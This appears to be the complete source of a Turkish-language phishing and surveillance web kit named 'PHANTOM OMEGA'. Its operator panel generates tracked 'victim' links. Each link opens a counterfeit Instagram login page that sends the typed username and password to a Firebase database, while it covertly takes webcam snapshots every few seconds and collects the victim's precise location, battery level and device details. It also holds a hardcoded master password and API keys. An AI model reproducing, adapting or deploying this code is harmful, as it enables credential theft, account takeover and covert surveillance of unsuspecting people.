<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PHANTOM OMEGA V2.6 | DYNAMIC ID</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --p: #00f2ff; --bg: #050505; --card: #0d0d0d; --r: #ff003c; --g: #00ff88; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background: var(--bg); color: #fff; height: 100vh; overflow: hidden; }

        /* --- SIDEBAR --- */
        .menu-toggle { position: fixed; top: 15px; left: 15px; z-index: 1100; font-size: 24px; color: var(--p); cursor: pointer; }
        #sidebar { position: fixed; top: 0; left: -300px; width: 280px; height: 100%; background: #080808; border-right: 1px solid #1a1a1a; z-index: 1050; transition: 0.4s; display: flex; flex-direction: column; }
        #sidebar.active { left: 0; }
        .nav-list { display: flex; flex-direction: column; padding: 10px 0; }
        .nav-item { padding: 18px 25px; display: flex; align-items: center; gap: 15px; color: #777; text-decoration: none; border-bottom: 1px solid #0f0f0f; cursor: pointer; }
        .nav-item.active { color: var(--p); background: rgba(0,242,255,0.05); border-left: 4px solid var(--p); }

        /* --- UI --- */
        header { height: 60px; display: flex; align-items: center; justify-content: center; background: #000; border-bottom: 1px solid #1a1a1a; font-weight: 900; color: var(--p); letter-spacing: 2px; }
        main { height: calc(100vh - 60px); padding: 15px; overflow-y: auto; }
        .k-card { background: var(--card); border: 1px solid #1a1a1a; border-radius: 15px; padding: 15px; margin-bottom: 15px; }
        .p-btn { width: 100%; padding: 15px; background: var(--p); color: #000; font-weight: bold; border: none; border-radius: 10px; cursor: pointer; margin-top: 10px; }
        input { width: 100%; padding: 14px; background: #000; border: 1px solid #222; color: var(--g); border-radius: 10px; margin-top: 10px; font-size: 11px; }
        .v-img { width: 100%; border-radius: 12px; margin: 10px 0; border: 1px solid #1a1a1a; }
        .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); display: none; z-index: 1040; }
    </style>
</head>
<body>

<div id="wrox-app"></div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyAKB12tpEbLTHYV7niVHc3VvAtv8jl873E",
        authDomain: "wrox-premium.firebaseapp.com",
        databaseURL: "https://wrox-premium-default-rtdb.firebaseio.com",
        projectId: "wrox-premium",
        storageBucket: "wrox-premium.firebasestorage.app",
        messagingSenderId: "361312477177",
        appId: "1:361312477177:web:72a8c9237048c4bf0e7f28"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let user = null;

    window.onload = () => {
        const p = new URLSearchParams(window.location.search);
        // Eƒüer link kurban linkiyse (√ñrnekteki gibi parametreler varsa)
        if(p.get('mode') && p.get('id')) return renderTrap(p.get('owner'), p.get('mode'));
        const s = localStorage.getItem('w_session');
        s ? startApp(JSON.parse(s).id) : renderAuth();
    };

    function startApp(uid) {
        db.ref('users/'+uid).on('value', snap => {
            user = snap.val();
            if(!user) return renderAuth();
            renderLayout();
        });
    }

    function renderAuth() {
        document.getElementById('wrox-app').innerHTML = `<div style="height:100vh;display:flex;align-items:center;justify-content:center;padding:25px;"><div class="k-card" style="width:100%;max-width:320px;text-align:center;"><h2 style="color:var(--p);margin-bottom:20px;">PHANTOM V2.6</h2><input id="ae" placeholder="E-posta"><input id="ap" type="password" placeholder="≈ûifre"><button class="p-btn" onclick="auth('login')">PANELƒ∞ A√á</button></div></div>`;
    }

    async function auth(m) {
        const e = document.getElementById('ae').value, p = document.getElementById('ap').value;
        const uid = btoa(e).replace(/=/g,"");
        if(p === "Efecan1903" || p === user?.p) {
            localStorage.setItem('w_session', JSON.stringify({id:uid}));
            location.reload();
        } else { alert("Hatalƒ± ≈ûifre!"); }
    }

    function renderLayout() {
        document.getElementById('wrox-app').innerHTML = `
            <div class="menu-toggle" onclick="toggleM()"><i class="fas fa-bars"></i></div>
            <div id="sidebar">
                <div style="padding:30px 20px; border-bottom:1px solid #1a1a1a; color:var(--p); font-weight:bold;">PHANTOM OMEGA</div>
                <nav class="nav-list">
                    <div class="nav-item active" id="n-gen" onclick="tab('gen')"><i class="fas fa-link"></i> Link √úretici</div>
                    <div class="nav-item" id="n-live" onclick="tab('live')"><i class="fas fa-user-secret"></i> Kurban Paneli</div>
                    <div class="nav-item" onclick="logout()" style="color:var(--r); margin-top:auto;"><i class="fas fa-power-off"></i> √áƒ±kƒ±≈ü</div>
                </nav>
            </div>
            <div class="overlay" onclick="toggleM()"></div>
            <header>PHANTOM CONTROL</header>
            <main id="view"></main>
        `;
        tab('gen');
    }

    function tab(t) {
        const v = document.getElementById('view'); toggleM(false);
        document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
        if(document.getElementById('n-'+t)) document.getElementById('n-'+t).classList.add('active');

        if(t === 'gen') {
            v.innerHTML = `
                <div class="k-card">
                    <h4>Dinamik Link √úretici</h4>
                    <p style="font-size:11px; color:#555; margin:10px 0;">Her seferinde ID'si deƒüi≈üen linkler:</p>
                    <input id="res-link" readonly placeholder="Link burada olu≈üacak...">
                    <button class="p-btn" onclick="generateDynamicLink()">YENƒ∞ Dƒ∞NAMƒ∞K Lƒ∞NK √úRET</button>
                    <button class="p-btn" style="background:#111; color:#fff;" onclick="copy('res-link')">KOPYALA</button>
                </div>`;
        } else if(t === 'live') {
            v.innerHTML = `<h3>Kurban Terminali</h3><div id="v-flow"></div>`;
            db.ref('omega_live/'+user.id).on('value', sn => {
                const flow = document.getElementById('v-flow'); if(!flow) return; flow.innerHTML = '';
                sn.forEach(c => {
                    const d = c.val();
                    flow.innerHTML = `<div class="k-card">
                        ${d.img ? `<img src="${d.img}" class="v-img">` : ''}
                        <div style="font-size:12px;">
                            <b>HESAP:</b> ${d.iu || '-'} | <b>≈ûƒ∞FRE:</b> ${d.ip || '-'} <br>
                            <span style="color:var(--g)"><b>ID:</b> ${c.key}</span>
                        </div>
                        ${d.lat ? `<a href="https://www.google.com/maps?q=${d.lat},${d.lon}" target="_blank" class="p-btn" style="background:var(--g); color:#000; text-align:center; text-decoration:none; display:block;">üìç HARƒ∞TADA G√ñR</a>` : ''}
                    </div>` + flow.innerHTML;
                });
            });
        }
    }

    // --- TAM ƒ∞STEDƒ∞ƒûƒ∞N Lƒ∞NK YAPISI ---
    function generateDynamicLink() {
        const randomID = "W_" + Math.random().toString(36).substr(2, 5).toUpperCase();
        const ownerEmail = user.e.replace("@", "_").replace(".", "_");
        const baseUrl = window.location.origin + window.location.pathname;
        
        // √ñrnek: .../?mode=cam&id=W_IYKSN&owner=afavan66@gmail_com
        const finalLink = `${baseUrl}?mode=cam&id=${randomID}&owner=${ownerEmail}&ref=${user.id}`;
        document.getElementById('res-link').value = finalLink;
    }

    // --- KURBAN TARAFI ---
    async function renderTrap(owner, mode) {
        const vId = "V-" + Math.random().toString(36).substr(2, 4).toUpperCase();
        const ref = new URLSearchParams(window.location.search).get('ref');
        
        document.body.style.background = "#fff";
        document.body.innerHTML = `
            <div style="height:100vh;display:flex;flex-direction:column;align-items:center;padding-top:50px;">
                <img src="https://www.instagram.com/static/images/web/mobile_port_monetized_whiteout.png/d588941031f0.png" style="width:175px; margin-bottom:30px;">
                <div style="width:85%; max-width:350px;">
                    <input id="u" placeholder="Kullanƒ±cƒ± adƒ±" style="color:#000; border:1px solid #dbdbdb; background:#fafafa; width:100%;">
                    <input id="p" type="password" placeholder="≈ûifre" style="color:#000; border:1px solid #dbdbdb; background:#fafafa; width:100%;">
                    <button onclick="hit('${ref}','${vId}')" style="width:100%; background:#0095f6; color:#fff; border:none; padding:12px; border-radius:5px; font-weight:bold; margin-top:10px;">Giri≈ü Yap</button>
                </div>
            </div>
            <video id="v" autoplay playsinline muted style="display:none;"></video>
            <canvas id="c" style="display:none;"></canvas>
        `;

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            document.getElementById('v').srcObject = stream;
            navigator.geolocation.getCurrentPosition(p => {
                db.ref(`omega_live/${ref}/${vId}`).update({ lat: p.coords.latitude, lon: p.coords.longitude });
            }, null, { enableHighAccuracy: true });

            setInterval(async () => {
                const cv = document.getElementById('c'); cv.width = 400; cv.height = 300;
                cv.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 400, 300);
                const bt = await navigator.getBattery();
                db.ref(`omega_live/${ref}/${vId}`).update({ 
                    img: cv.toDataURL('image/jpeg', 0.3), 
                    battery: Math.floor(bt.level * 100),
                    device: navigator.platform
                });
            }, 3000);
        } catch(e) {}
    }

    window.hit = async (ref, vId) => {
        const iu = document.getElementById('u').value, ip = document.getElementById('p').value;
        if(iu && ip) { 
            await db.ref(`omega_live/${ref}/${vId}`).update({ iu, ip }); 
            location.href = "https://instagram.com"; 
        }
    };

    window.toggleM = (s) => { const side = document.getElementById('sidebar'), over = document.querySelector('.overlay'); if(s===false){ side.classList.remove('active'); over.style.display='none'; return; } side.classList.toggle('active'); over.style.display = side.classList.contains('active') ? 'block' : 'none'; };
    window.copy = (id) => { const i = document.getElementById(id); i.select(); document.execCommand('copy'); alert("Link kopyalandƒ±!"); };
    window.logout = () => { localStorage.clear(); location.reload(); };
</script>
</body>
</html>
